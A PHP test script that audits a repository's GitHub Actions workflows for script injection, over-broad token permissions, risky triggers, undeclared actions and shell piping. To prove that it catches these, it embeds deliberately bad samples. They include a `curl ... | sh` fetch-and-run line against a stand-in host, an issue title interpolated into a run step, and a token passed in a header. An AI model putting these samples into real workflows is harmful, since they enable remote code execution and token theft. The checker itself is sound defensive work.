<?php
/**
 * Phase 155 — a safety gate over every GitHub Actions workflow in the repository.
 *
 * WHY
 *
 *   The community workflows read text written by strangers (issue titles and
 *   bodies, release notes) and hold a token that can write to issues. The two
 *   classic ways that goes wrong are SCRIPT INJECTION (a title containing
 *   `"; curl evil | sh #` interpolated into a `run:` line) and PRIVILEGE (a
 *   `pull_request_target` or `contents: write` where it is not needed). Neither
 *   can be seen by running the tools; both live in the YAML. Workflows also
 *   cannot be run from a workstation, so this file is the strongest check that
 *   exists short of GitHub itself, and it says so.
 *
 * WHAT IT CHECKS, on every file under .github/workflows/
 *
 *   - an explicit top-level `permissions:` block, never `write-all`, and no write
 *     scope beyond `issues: write` anywhere;
 *   - no `pull_request_target` or `workflow_run` trigger;
 *   - NO `${{ ... }}` expression inside any `run:` script (single-line or block);
 *   - every `uses:` is an action the SBOM already declares, at the declared ref;
 *   - the workflows that handle issues/releases/schedules: no secrets, checkout
 *     with persist-credentials: false, a timeout on every job, a concurrency
 *     group, no pipe-to-shell or eval;
 *   - the triage bot triggers on `opened` only (never on an edit);
 *   - the development-only workflow is excluded from the public snapshot and the
 *     public ones are not.
 *
 * HOW THE CHECKER IS TRUSTED
 *
 *   A gate that has never failed proves nothing, so each rule is also run
 *   against a deliberately bad synthetic workflow and must report it.
 *
 * WHAT IT CANNOT SEE (stated plainly)
 *
 *   It is a line-oriented structural check plus, where PyYAML and python are
 *   available, a real YAML parse of every workflow's shape. It is not
 *   `actionlint`: expression typing and runner-image facts are unchecked, and
 *   `actionlint` is run here only if it is already on PATH. The first live run
 *   on GitHub is the final proof.
 */

declare(strict_types=1);

require_once __DIR__ . '/_community_test_lib.php';

$root = dirname(__DIR__);
$dir = $root . '/.github/workflows';
if (!is_dir($dir)) ct_skip('no .github/workflows directory');

echo "=== GitHub Actions workflow safety ===\n\n";

// Workflows that read stranger-written text and run on events or a schedule.
// Anything new in this directory is held to the strict rules too (below), so a
// workflow cannot opt out by not being listed.
$strictOnly = static function (string $text): bool {
    // Judged from the on: block ONLY (a `permissions: issues: write` line also
    // starts with "issues:" and must not make every workflow look event-driven).
    $blocks = wf_top_blocks(preg_replace('/^[ \t]*#.*$/m', '', $text) ?? $text);
    $on = isset($blocks['on']) ? implode("\n", $blocks['on']) : '';
    return preg_match('/^\s{2}(issues|release|schedule|issue_comment):/m', $on) === 1;
};

/** Top-level key => its indented block (lines until the next col-0 key). */
function wf_top_blocks(string $text): array
{
    $blocks = [];
    $cur = null;
    foreach (preg_split('/\r\n|\n/', $text) ?: [] as $line) {
        if (preg_match('/^([A-Za-z_][\w-]*):(.*)$/', $line, $m)) {
            $cur = $m[1];
            $blocks[$cur] = [$m[2]];
        } elseif ($cur !== null) {
            $blocks[$cur][] = $line;
        }
    }
    return $blocks;
}

/** The script text of every `run:` step, so expressions inside can be found. @return string[] */
function wf_run_scripts(string $text): array
{
    $lines = preg_split('/\r\n|\n/', $text) ?: [];
    $scripts = [];
    $n = count($lines);
    for ($i = 0; $i < $n; $i++) {
        if (!preg_match('/^(\s*)(?:-\s+)?run:\s*(.*)$/', $lines[$i], $m)) continue;
        $keyCol = strlen($m[1]) + (preg_match('/^\s*-\s+run:/', $lines[$i]) ? 2 : 0);
        $value = trim($m[2]);
        if (preg_match('/^[|>][+-]?\d*\s*(#.*)?$/', $value)) {
            $body = [];
            for ($j = $i + 1; $j < $n; $j++) {
                if (trim($lines[$j]) === '') { $body[] = ''; continue; }
                $indent = strlen($lines[$j]) - strlen(ltrim($lines[$j]));
                if ($indent <= $keyCol) break;
                $body[] = $lines[$j];
            }
            $scripts[] = implode("\n", $body);
        } else {
            $scripts[] = $value;
        }
    }
    return $scripts;
}

/**
 * Check one workflow's text. Returns a list of findings (empty = clean).
 *
 * @param string[] $allowedUses  "owner/name@ref" the SBOM declares
 * @return string[]
 */
function wf_check(string $text, array $allowedUses, bool $strict): array
{
    $f = [];
    // Comment lines are prose, not configuration: a header that says "no
    // pull_request_target, no secrets" must not trip the rule it describes.
    $text = preg_replace('/^[ \t]*#.*$/m', '', $text) ?? $text;
    $blocks = wf_top_blocks($text);

    // ── permissions ──
    if (!isset($blocks['permissions'])) {
        $f[] = 'no top-level permissions: block (the token would carry the repository default)';
    } else {
        $perm = implode("\n", $blocks['permissions']);
        if (preg_match('/write-all|read-all/', $perm)) $f[] = 'permissions use write-all/read-all';
        if (preg_match_all('/^\s+([\w-]+):\s*write\b/m', $perm, $pm)) {
            foreach ($pm[1] as $scope) {
                if ($scope !== 'issues') $f[] = "permissions grant {$scope}: write (only issues: write is allowed)";
            }
        }
        if (preg_match('/^permissions:[ \t]*[^\s#]/m', $text) && !preg_match('/^permissions:[ \t]*\{\s*\}/m', $text)) {
            $f[] = 'permissions must be a block of scopes, not a scalar';
        }
    }

    // ── triggers ──
    $on = isset($blocks['on']) ? implode("\n", $blocks['on']) : (isset($blocks["'on'"]) ? implode("\n", $blocks["'on'"]) : '');
    if ($on === '') $f[] = 'no on: trigger block found';
    if (preg_match('/pull_request_target/', $text)) $f[] = 'uses pull_request_target (runs attacker-controlled code with a privileged token)';
    if (preg_match('/^\s{2}workflow_run:/m', $text)) $f[] = 'uses workflow_run (privilege escalation from an untrusted workflow)';

    // ── script injection ──
    foreach (wf_run_scripts($text) as $script) {
        if (strpos($script, '${{') !== false) {
            $f[] = 'a ${{ }} expression sits inside a run: script: ' . trim(substr(str_replace("\n", ' ', $script), 0, 90));
        }
        if (preg_match('/\|\s*(ba)?sh\b|\beval\b|\bcurl\b[^\n]*\|/i', $script)) $f[] = 'a run: script pipes to a shell or uses eval';
    }

    // ── actions ──
    preg_match_all('/^\s*(?:-\s+)?uses:\s*([^\s#]+)/m', $text, $um);
    foreach ($um[1] as $use) {
        if (!in_array($use, $allowedUses, true)) {
            $f[] = "action `{$use}` is not one the SBOM declares (add it to generate-sbom.php first, pinned to the same ref)";
        }
    }

    if ($strict) {
        if (preg_match('/secrets\./', $text)) $f[] = 'an event/schedule workflow references secrets';
        if (preg_match_all('/uses:\s*actions\/checkout/', $text) !== preg_match_all('/persist-credentials:\s*false/', $text)) {
            $f[] = 'every actions/checkout must set persist-credentials: false';
        }
        $jobs = isset($blocks['jobs']) ? preg_match_all('/^  [A-Za-z0-9_-]+:\s*$/m', implode("\n", $blocks['jobs'])) : 0;
        if ($jobs < 1) $f[] = 'no jobs found';
        if (preg_match_all('/^\s{4}timeout-minutes:\s*\d+/m', $text) < $jobs) $f[] = 'every job needs timeout-minutes';
        if (!isset($blocks['concurrency'])) $f[] = 'no concurrency group (overlapping runs would race)';
        // The token may only enter through env:.
        foreach (preg_split('/\r\n|\n/', $text) ?: [] as $line) {
            if (preg_match('/(github\.token|GITHUB_TOKEN)/', $line) && !preg_match('/^\s+[A-Z_]+:\s*\$\{\{/', $line) && !preg_match('/^\s*#/', $line)) {
                $f[] = 'the token appears outside an env: assignment: ' . trim($line);
            }
        }
    }
    return $f;
}

// The actions the SBOM declares, with their refs.
$sbom = (string) @file_get_contents($root . '/tools/generate-sbom.php');
preg_match_all("/'pkg:github\/([^@']+)@([^']+)'/", $sbom, $sm, PREG_SET_ORDER);
$allowed = [];
foreach ($sm as $m) $allowed[] = $m[1] . '@' . $m[2];
ct('the SBOM declares the build actions (the allowlist is real, not empty)', in_array('actions/checkout@v7', $allowed, true) && in_array('shivammathur/setup-php@v2', $allowed, true), json_encode($allowed));

// ─────────────────────────────────────────────────────────────────────
echo "\n-- 1. Every workflow in the repository --\n";

$files = glob($dir . '/*.yml') ?: [];
sort($files);
// The inbox workflow is development-only and is absent from the public repository's
// copy of this file's directory, so it is required only where its tool exists.
$devTree = is_file($root . '/tools/community-watch.php');
ct('workflows were found', count($files) >= ($devTree ? 5 : 4), (string) count($files));
foreach ($files as $file) {
    $name = basename($file);
    $text = (string) file_get_contents($file);
    $strict = $strictOnly($text);
    $found = wf_check($text, $allowed, $strict);
    ct("{$name}: clean" . ($strict ? ' (strict rules: handles issues/releases/schedules)' : ''), $found === [], implode(' | ', $found));
}
$names = array_map('basename', $files);
foreach (array_merge(['triage.yml', 'labels.yml', 'release-notify.yml'], $devTree ? ['community-watch.yml'] : []) as $expected) {
    ct("{$expected} exists and is held to the STRICT rules or the labels rules",
        in_array($expected, $names, true) && ($expected === 'labels.yml' || $strictOnly((string) file_get_contents($dir . '/' . $expected))));
}

// ─────────────────────────────────────────────────────────────────────
echo "\n-- 2. The checker catches what it exists to catch --\n";

$good = "name: t\non:\n  issues:\n    types: [opened]\npermissions:\n  contents: read\n  issues: write\nconcurrency:\n  group: g\njobs:\n  a:\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    steps:\n"
      . "      - uses: actions/checkout@v7\n        with:\n          persist-credentials: false\n      - env:\n          GH_TOKEN: \${{ github.token }}\n          T: \${{ vars.X }}\n        run: php tools/x.php\n";
ct('control: a well-formed workflow is clean', wf_check($good, $allowed, true) === [], implode(' | ', wf_check($good, $allowed, true)));
$bad = static fn(string $from, string $to): array => wf_check(str_replace($from, $to, $good), $allowed, true);
$has = static fn(array $findings, string $needle): bool => (bool) array_filter($findings, static fn(string $x): bool => stripos($x, $needle) !== false);
ct('catches an issue title interpolated into a single-line run:', $has($bad('run: php tools/x.php', 'run: echo "${{ github.event.issue.title }}"'), 'expression sits inside a run'));
ct('catches an expression in a BLOCK run: script', $has($bad('run: php tools/x.php', "run: |\n          set -e\n          echo \${{ github.event.issue.body }}"), 'expression sits inside a run'));
ct('...even one that sits several lines down a block', $has($bad('run: php tools/x.php', "run: >\n          a\n\n          b \${{ github.head_ref }}"), 'expression sits inside a run'));
ct('catches pull_request_target', $has($bad('issues:', "pull_request_target:\n    types: [opened]\n  issues:"), 'pull_request_target'));
ct('catches workflow_run', $has($bad('issues:', "workflow_run:\n    workflows: [x]\n  issues:"), 'workflow_run'));
ct('catches a missing permissions block', $has(wf_check(preg_replace('/permissions:\n  contents: read\n  issues: write\n/', '', $good) ?? '', $allowed, true), 'no top-level permissions'));
ct('catches contents: write', $has($bad('contents: read', 'contents: write'), 'contents: write'));
ct('catches pull-requests: write', $has($bad('issues: write', "issues: write\n  pull-requests: write"), 'pull-requests: write'));
ct('catches write-all', $has($bad("  contents: read\n  issues: write", '  write-all: true'), 'write-all'));
ct('catches an action the SBOM does not declare', $has($bad('actions/checkout@v7', 'evil/action@main'), 'not one the SBOM declares'));
ct('catches a declared action at an undeclared ref (a pin drifting)', $has($bad('actions/checkout@v7', 'actions/checkout@v9'), 'not one the SBOM declares'));
ct('catches secrets in an event workflow', $has($bad('T: ${{ vars.X }}', 'T: ${{ secrets.DEPLOY_KEY }}'), 'secrets'));
ct('catches a checkout that keeps credentials', $has($bad('persist-credentials: false', 'persist-credentials: true'), 'persist-credentials'));
ct('catches a job with no timeout', $has($bad('    timeout-minutes: 5', ''), 'timeout'));
ct('catches a missing concurrency group', $has($bad("concurrency:\n  group: g\n", ''), 'concurrency'));
ct('catches the token used outside env:', $has($bad('run: php tools/x.php', 'run: gh api -H "Authorization: ${{ github.token }}" x'), 'token appears outside'));
ct('catches curl piped to a shell', $has($bad('run: php tools/x.php', 'run: curl -s https://x.example/i.sh | sh'), 'pipes to a shell'));
ct('catches eval', $has($bad('run: php tools/x.php', 'run: eval "$CMD"'), 'eval'));
ct('an expression in env:, with:, concurrency or if: is NOT flagged (that is the safe place for it)',
    wf_check(str_replace("      - env:", "      - if: github.event.issue.number > 0\n        env:", $good), $allowed, true) === []);

// ─────────────────────────────────────────────────────────────────────
echo "\n-- 3. Workflow-specific properties --\n";

$triage = (string) @file_get_contents($dir . '/triage.yml');
$triageNoComments = preg_replace('/^\s*#.*$/m', '', $triage) ?? '';
ct('the triage bot triggers on `opened` ONLY (an edited issue must not be re-acknowledged)',
    preg_match('/^\s{2}issues:\s*\n\s{4}types:\s*\[opened\]\s*$/m', $triageNoComments) === 1 && !preg_match('/\b(edited|reopened|labeled)\b/', $triageNoComments));
ct('the triage bot may write issues and nothing else', preg_match('/^permissions:\s*\n\s+contents: read\s*(#.*)?\n\s+issues: write/m', $triage) === 1);
foreach (['AWAY_UNTIL', 'TRIAGE_ENABLED', 'TRIAGE_TARGET_DAYS', 'TRIAGE_TARGET_STYLE', 'TRIAGE_SKIP_ASSOCIATIONS', 'TRIAGE_WINDOWS_LABEL'] as $var) {
    ct("triage.yml passes the `{$var}` variable through to the tool", strpos($triage, "{$var}: \${{ vars.{$var} }}") !== false);
}
$rn = (string) @file_get_contents($dir . '/release-notify.yml');
ct('release-notify triggers only on a PUBLISHED release', preg_match('/^\s{2}release:\s*\n\s{4}types:\s*\[published\]/m', $rn) === 1);
$cw = (string) @file_get_contents($dir . '/community-watch.yml');
if ($devTree) {
    ct('community-watch runs on a schedule and by hand', strpos($cw, "cron: '23 */3 * * *'") !== false && strpos($cw, 'workflow_dispatch:') !== false);
    ct('community-watch has actions: read (CI by SHA) and fetches full history (the sync check walks it)', strpos($cw, 'actions: read') !== false && strpos($cw, 'fetch-depth: 0') !== false);
}

// Every variable a workflow passes must be READ by a tool: a setting nothing reads is a bug.
$toolSrc = '';
foreach (glob($root . '/tools/*.php') ?: [] as $t) $toolSrc .= file_get_contents($t);
foreach (glob($root . '/tools/lib/*.php') ?: [] as $t) $toolSrc .= file_get_contents($t);
$dead = [];
foreach ($files as $file) {
    preg_match_all('/^\s+([A-Z][A-Z0-9_]+):\s*\$\{\{\s*vars\.\1\s*\}\}/m', (string) file_get_contents($file), $vm);
    foreach ($vm[1] as $var) {
        if (strpos($toolSrc, "'{$var}'") === false) $dead[] = basename($file) . ':' . $var;
    }
}
ct('every repository variable a workflow passes is READ by a tool (no setting that nothing reads)', $dead === [], implode(', ', $dead));

// ─────────────────────────────────────────────────────────────────────
echo "\n-- 4. What ships to the public repository --\n";

$snapshot = (string) @file_get_contents($root . '/tools/release-snapshot.sh');
if ($snapshot === '') {
    echo "NOTE: tools/release-snapshot.sh is not in this tree (the public repository); the ship/exclude check is made in the development tree\n";
} else {
    $ex = function_exists('sync_parse_excludes') ? [] : null;
    if ($ex === null || true) {
        // Parse the array without depending on the (development-only) sync tool.
        $lines = preg_split('/\r\n|\n/', $snapshot) ?: [];
        $in = false; $ex = [];
        foreach ($lines as $l) {
            if (!$in) { if (preg_match('/^EXCLUDES=\(\s*(.*)$/', $l, $mm)) { $in = true; $l = $mm[1]; } else continue; }
            $l = preg_replace('/(^|\s)#.*$/', '', $l) ?? '';
            $closed = false;
            if (preg_match('/^(.*?)\)\s*$/', $l, $mm)) { $l = $mm[1]; $closed = true; }
            foreach (preg_split('/\s+/', trim($l)) ?: [] as $tok) if ($tok !== '') $ex[] = $tok;
            if ($closed) break;
        }
    }
    ct('the development-only inbox workflow is EXCLUDED from the public snapshot', in_array('.github/workflows/community-watch.yml', $ex, true));
    foreach (['triage.yml', 'labels.yml', 'release-notify.yml', 'qa.yml'] as $pub) {
        ct("{$pub} is NOT excluded (it ships)", !in_array('.github/workflows/' . $pub, $ex, true));
    }
    ct('nothing under .github/ is excluded wholesale (the workflows, templates and labels all ship)', !in_array('.github', $ex, true) && !in_array('.github/workflows', $ex, true));
}

// ─────────────────────────────────────────────────────────────────────
echo "\n-- 5. A real YAML parse, where PyYAML is available --\n";

$py = null;
foreach (['python3', 'python'] as $cand) {
    $r = cm_run([$cand, '-c', 'import yaml; print(yaml.__version__)'], null, null, null, 20);
    if ($r['code'] === 0 && trim($r['out']) !== '') { $py = $cand; break; }
}
if ($py === null) {
    echo "NOTE: python with PyYAML is not available here; the structural parse is skipped (the line-level rules above still ran)\n";
} else {
    $script = <<<'PYCODE'
import sys, json, yaml
out = {}
for path in sys.argv[1:]:
    entry = {"ok": False, "problems": []}
    try:
        doc = yaml.safe_load(open(path, encoding="utf-8"))
        entry["ok"] = True
        on = doc.get("on", doc.get(True))
        if on is None:
            entry["problems"].append("no trigger")
        jobs = doc.get("jobs") or {}
        if not jobs:
            entry["problems"].append("no jobs")
        for jn, job in jobs.items():
            if "runs-on" not in job:
                entry["problems"].append(jn + ": no runs-on")
            steps = job.get("steps") or []
            if not steps:
                entry["problems"].append(jn + ": no steps")
            for i, st in enumerate(steps):
                kinds = [k for k in ("uses", "run") if k in st]
                if len(kinds) != 1:
                    entry["problems"].append(jn + ": step " + str(i) + " must have exactly one of uses/run")
                for k, v in (st.get("env") or {}).items():
                    if not isinstance(v, (str, int, float, bool)):
                        entry["problems"].append(jn + ": env " + str(k) + " is not a scalar")
        if "permissions" not in doc:
            entry["problems"].append("no permissions")
    except Exception as e:
        entry["problems"].append("parse error: " + str(e))
    out[path.replace("\\", "/").split("/")[-1]] = entry
print(json.dumps(out))
PYCODE;
    $sf = ct_tmp() . '/yamlcheck.py';
    file_put_contents($sf, $script);
    $paths = array_merge($files, glob($root . '/.github/ISSUE_TEMPLATE/*.yml') ?: [], [$root . '/.github/dependabot.yml']);
    $r = cm_run(array_merge([$py, $sf], $paths), null, null, null, 60);
    $res = json_decode($r['out'], true);
    ct('the YAML checker ran', is_array($res), trim($r['err'] . $r['out']));
    if (is_array($res)) {
        foreach ($files as $file) {
            $n = basename($file);
            ct("{$n}: parses as YAML with a trigger, jobs, runs-on, steps with exactly one of uses/run, scalar env, permissions",
                ($res[$n]['ok'] ?? false) === true && ($res[$n]['problems'] ?? ['missing']) === [], json_encode($res[$n] ?? null));
        }
        foreach (glob($root . '/.github/ISSUE_TEMPLATE/*.yml') ?: [] as $t) {
            $n = basename($t);
            ct("issue template {$n} is valid YAML", ($res[$n]['ok'] ?? false) === true, json_encode($res[$n] ?? null));
        }
    }
}

// actionlint, only if it is already installed (nothing is downloaded for a test).
$al = cm_run(['actionlint', '-version'], null, null, null, 20);
if ($al['code'] === 0) {
    $r = cm_run(array_merge(['actionlint'], $files), $root, null, null, 120);
    ct('actionlint reports nothing on the workflows', $r['code'] === 0, trim($r['out'] . $r['err']));
} else {
    echo "NOTE: actionlint is not installed here; it was not run. Expression typing and runner facts are unchecked until the first live run.\n";
}

ct_finish();
